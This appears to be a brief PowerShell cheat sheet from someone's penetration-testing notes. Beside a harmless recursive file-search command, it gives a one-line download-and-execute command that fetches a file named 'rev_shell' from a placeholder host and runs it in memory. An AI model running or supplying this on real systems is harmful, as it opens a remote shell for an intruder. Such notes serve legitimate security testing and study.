# Powershell

## Usage

Download and execute file using powershell:

	powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<localhostip>/rev_shell")'

Search for files

	Get-ChildItem -Path "C:\Path\To\Search" -Recurse -Filter "filename*"